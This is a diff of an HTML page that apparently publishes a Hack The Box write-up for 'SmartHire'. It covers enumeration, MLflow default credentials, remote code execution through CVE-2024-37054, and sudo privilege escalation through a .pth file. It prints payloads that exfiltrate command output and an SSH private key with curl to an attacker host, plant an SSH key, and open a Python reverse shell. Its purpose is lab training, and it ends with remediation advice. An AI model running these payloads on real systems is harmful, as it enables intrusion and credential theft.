@@ -2,6 +2,12 @@
 <html lang="en">
 
 <head>
+  <meta property="og:title" content="SmartHire — Hack The Box Writeup">
+  <meta property="og:description" content="Penetration testing writeup covering MLflow RCE, post-exploitation and Python privilege escalation.">
+  <meta property="og:image" content="https://yassine-sabir.github.io/writeups/SmartHire/assets/linkedin-preview.png">
+  <meta property="og:url" content="https://yassine-sabir.github.io/writeups/SmartHire/">
+  <meta property="og:type" content="article">
+
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   <title>HTB Writeup - SmartHire</title>
@@ -67,7 +73,7 @@
         </div>
         <div>
           <span class="meta-label">Platform</span>
-          <span class="meta-value" , src="color:green">Hack The Box</span>
+          <span class="meta-value" , src="color:green">HackTheBox</span>
         </div>
         <div>
           <span class="meta-label">IP Address</span>
@@ -81,20 +87,338 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+  SmartHire is a medium-difficulty Linux machine on HackTheBox focused on  web exploitation, MLflow model abuse, and Python privilege escalation.
+  The attack chain involves discovering exposed MLflow services, exploiting CVE-2024-37054 for remote code execution, and abusing unsafe Python plugin loading mechanisms to obtain root access.
       </p>
     </section>
 
-    <section aria-labelledby="overview-title" class="card section-overview">
+    <section aria-labelledby="description-title" class="card section-description">
       <header class="section-heading">
-        <p class="eyebrow">Proof of Completion</p>
-        <h2 id="overview-title">Proof of Completion</h2>
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
       </header>
+      <p>
+        The assessment began with a comprehensive service enumeration using <strong>Nmap</strong> to identify
+        exposed services and their versions.
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.34.73</code>
+      </p>
+      <p>
+        The scan identified two accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Nmap scan report for 10.129.34.73
+Host is up (0.049s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://smarthire.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects incoming requests to the virtual host <code>smarthire.htb</code>. To interact with the application correctly, the domain was added to the local <code>/etc/hosts</code> file.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.34.73  smarthire.htb" >> /etc/hosts</code>
+      </p>
+
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">VHost Enumeration</h2>
+      </header>
+      <p>Virtual host enumeration was performed to identify additional virtual hosts available on the target domain.</p>
+      <p>
+        <code class="language-bash">ffuf -w Discovery/DNS/combined_subdomains.txt -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" -fs 178</code>
+      <pre class="terminal">
+              <code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://smarthire.htb
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/combined_subdomains.txt
+ :: Header           : Host: FUZZ.smarthire.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 178
+________________________________________________
+
+models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 11ms]   
+ </code></pre>
+      </p>
+      <p>The enumeration identified the virtual host <strong>models.smarthire.htb</strong>, which hosts an <strong>MLflow</strong> instance protected by HTTP Basic Authentication.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Vulnerability Analysis</h2>
+      </header>
+
+      <header class="section-heading">
+        <h3 id="mlflow-authentication">MLflow Authentication</h3>
+      </header>
+
+    <p>Accessing the virtual host reveals an MLflow instance protected by HTTP Basic Authentication.</p>
+<p>
+        <code class="language-bash">curl -I http://models.smarthire.htb/</code>
+      <pre class="terminal">
+              <code>
+HTTP/1.1 401 UNAUTHORIZED
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 16 May 2026 22:12:06 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 137
+Connection: keep-alive
+WWW-Authenticate: Basic realm="mlflow"
+ </code></pre>
+      </p>
+
+      <p>  Testing the default MLflow credentials successfully granted access to the dashboard using <code>admin:password</code> <a class="ref" href="#references">[1]</a>.</p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Version Identification</h3>
+      </header>
+
+      <p>After authentication, the MLflow version was identified as <strong>2.14.1</strong>.</p>
+
+      <img src="assets/MlLflow_version.png"/>
+
+      <p>MLflow 2.14.1 is vulnerable to <strong>CVE-2024-37054</strong>, a remote code execution vulnerability caused by untrusted model deserialization.</p>
+
+      <header class="section-heading">
+        <h3 id="overview-title">Remote Code Execution CVE-2024-37054</h3>
+      </header>
+      <p>A public proof-of-concept exploit for the vulnerability is available on GitHub <a class="ref" href="#references">[2]</a>.</p>
+
+      <p>The exploit contains two python scripts:
+        <ol>
+          <li> <strong>log_malicious_model.py</strong>: Generates a malicious MLflow model that contains the command that we want to execute on the server</li>
+          <li> <strong>load_vulnerable_model.py</strong>: Loads the vulnerable MLflow model which results in execution of the malicious command</li>
+        </ol>
+      </p>
+
+      <p>
+    The second script loads the malicious model locally, meaning code execution would only occur on the attacker's machine. 
+    To exploit the target server, a server-side functionality capable of loading attacker-controlled models must first be identified.
+      </p>
+    
+      <p>The next objective is to identify a feature within the application that loads MLflow models on the server.</p>
+      
+      <header class="section-heading">
+        <h4 id="overview-title">Loading MLflow Models</h4>
+      </header>
+
+      <p>The web application hosted on <strong>smarthire.htb</strong> exposes functionality that trains and loads MLflow models based on user-given data.</p>
+
+      <img src="assets/model_training.png" width="80%"/>
+
+      <p>The sample CSV file provided by the application was used to train a legitimate model.</p>
+
+      <img src="assets/example_csv.png" width="80%"/>
+
+      <p>After uploading the dataset, the application successfully generated a new MLflow model.</p>
+
+      <img src="assets/trained_model.png" width="80%"/>
+
+      <p>The resulting model predicts whether a candidate is likely to be hired based on the supplied input data.</p>
+      
+      <img src="assets/predict.png" width="80%"/>
+
+      <p>The MLflow dashboard confirms that the generated model was successfully saved.</p>
+      
+      <img src="assets/MLflow_trained_model.png" width="60%"/>
+
+      <p>Since the application loads trained models during prediction requests, the existing model can now be replaced with a malicious one.</p>
+
+      <header class="section-heading">
+        <h4 id="overview-title">Exploitation</h4>
+      </header>
+      
+      <header class="section-heading">
+        <h5 id="overview-title">Weaponizing the MLflow Model</h5>
+      </header>
+      <p>To authenticate to the MLflow instance, the following environment variables were defined <a class="ref" href="#references">[3]</a>.</p>
+      <p>
+        <code class="language-bash">export MLFLOW_TRACKING_USERNAME="admin"
+export MLFLOW_TRACKING_PASSWORD="password"</code></p>
+        <p>The script <code>log_malicious_model.py</code> was modified to target the vulnerable MLflow server and overwrite the previously generated model.</p>
+
+        <p>
+        <code class="language-python"># Server URL
+MLFLOW_TRACKING_URI = "http://models.smarthire.htb"
+
+# Name of the model we want to change
+REGISTERED_MODEL_NAME = "test-0470e5fe764f-model"
+
+# Command we want to execute
+cmd = 'curl -X POST -d "$(whoami)" http://&lt;ATTACKER_IP&gt;:4444' # Change &lt;ATTACKER_IP&gt; to your IP address</code></p>
+
+      <p>After executing the script, the model was overwritten with the malicious payload. The updated version became visible within the MLflow dashboard.</p>
+      <img src="assets/MLflow_version_change.png" width="60%"/>
+      <p>A Netcat listener was started on the attacker's machine, and the malicious model was triggered through the application's prediction functionality.</p>
+      <p>Loading the model resulted in execution of the embedded command.</p>
+      <img src="assets/whoami.png" width="80%"/>
+      <p>The received HTTP request confirms successful remote code execution on the target server.</p>
+
+      <header class="section-heading">
+        <h5 id="overview-title">Establishing Persistent Access</h5>
+      </header>
+      <p>To establish persistent access, a second malicious model was created to generate a new SSH key pair, append the public key to <code>~/.ssh/authorized_keys</code>, and configure the required permissions.</p>
+      
+      <p><code class="language-python">cmd = 'mkdir -p ~/.ssh/mykeys && ssh-keygen -t ed25519 -f ~/.ssh/mykeys/id_ed25519 -N "" && cat ~/.ssh/mykeys/id_ed25519.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'</code></p>
+
+      <p>Triggering the model caused the SSH key generation command to execute on the target system.</p>
+      
+      <p>A third malicious model was then created to exfiltrate the generated private key to an attacker-controlled listener.</p>
+
+      <p><code class="language-python">cmd = 'curl -X POST -d "$(cat ~/.ssh/mykeys/id_ed25519)" http://&lt;ATTACKER_IP&gt;:4444'</code></p>
+      <p>After triggering the payload, the private key was successfully received on the attacker's machine.</p>
+
+      <img src="assets/ssh_key.png" width="80%"/>
+
+      <p>The exfiltrated private key allowed SSH authentication as the user <strong>svcweb</strong>.</p>
+
+      <img src="assets/ssh_session.png" width="80%"/>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Post-Exploitation Enumeration</h2>
+      </header>
+
+      <p>After obtaining access as <strong>svcweb</strong>, local enumeration was performed to identify potential privilege escalation vectors.</p>
+
+      <header class="section-heading">
+      <h3 id="overview-title">Svcweb Sudo Privileges</h3>
+    </header>
+
+       <p>The <strong>svcweb</strong> user is allowed to execute a custom Python utility with sudo privileges without requiring a password.</p>
+
+      <p class="center-code">
+        <code class="language-bash">sudo -l</code>
+      <pre class="terminal">
+              <code>
+Matching Defaults entries for svcweb on smarthire:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User svcweb may run the following commands on smarthire:
+    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
+            </code></pre>
+      </p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Python Script Analysis</h2>
+      </header>
+
+      <p>The <code>mlflowctl.py</code> script is used to manage MLflow-related services on the target system.</p>
+
+      <p>The script dynamically imports plugins from <code>/opt/tools/mlflow_ctl/plugins/</code> using Python's <strong>site</strong> module.</p>
+      <p><code class="language-python"># make plugins importable
+for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))
+</code></p>
+      <p>One of the plugin directories, <strong>dev</strong>, is writable by the current user.</p>
+
+<p class="center-code">
+        <code class="language-bash">ls /opt/tools/mlflow_ctl/plugins/ -la</code>
+      <pre class="terminal">
+              <code>
+total 16
+drwxr-xr-x 4 root root 4096 Feb 19 18:10 .
+drwxr-xr-x 3 root root 4096 Feb 19 18:16 ..
+drwxr-xr-x 3 root root 4096 Feb 20 09:26 core
+drwxrwxr-x 2 root devs 4096 May 12 15:22 dev
+            </code></pre>
+      </p>
+
+      <p>According to the official Python documentation <a class="ref" href="#references">[4]</a>, Python automatically processes <strong>path configuration files</strong> (with the <code>.pth</code> extension) when loading paths through <code>site.addsitedir()</code>. Any lines beginning with <code>import</code> within these files are executed automatically.</p>
+
+      <p>A malicious <code>.pth</code> file was created within the writable plugin directory:</p>
+
+      <p><code class="language-bash">echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth</code></p>
+      
+      <p>The script was then executed with sudo privileges:</p>
+      <p><code class="language-bash">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</code></p>
+
+      <p>When the script executed, Python processed the malicious <code>.pth</code> file and executed the embedded payload, resulting in a root reverse shell.</p>
+      
+      <img src="assets/root_shell.png" width="60%"/>
+      </section>
+
+
+      <section aria-labelledby="overview-title" class="card section-overview">
+      <header class="section-heading">
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
+      </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade <strong>MLflow</strong> to version <strong>2.14.3 or later</strong></li>
+        <li>Remove default credentials and enforce strong authentication policies.</li>
+        <li>Restrict model manipulation/creations from untrusted sources.</li>
+        <li>Avoid loading Python plugins from writable directories.</li>
+        <li>Restrict sudo permissions according to the principle of least privilege.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/mlflow/mlflow/commit/73108598f64415c62f72f4fb2d64c97579f4ea18"
+            target="_blank" rel="noopener noreferrer">
+            MLflow GitHub | MLflow default credentials</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://github.com/NiteeshPujari/CVE-2024-37054-MLflow-RCE"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2024-37054 MLflow RCE</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">3</span>]</span>
+          <a href="https://mlflow.org/docs/2.10.1/auth/index.html#using-environment-variables"
+            target="_blank" rel="noopener noreferrer">
+            MLflow Documentation | Using Environment Variables</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">4</span>]</span>
+          <a href="https://docs.python.org/3.14/library/site.html#index-2"
+            target="_blank" rel="noopener noreferrer">
+            Python Documentation | site — Site-specific configuration hook</a>
+        </li>
+
+      </ol>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
       <img src="./assets/machine_solved.png" width="100%"/>
     </section>
 
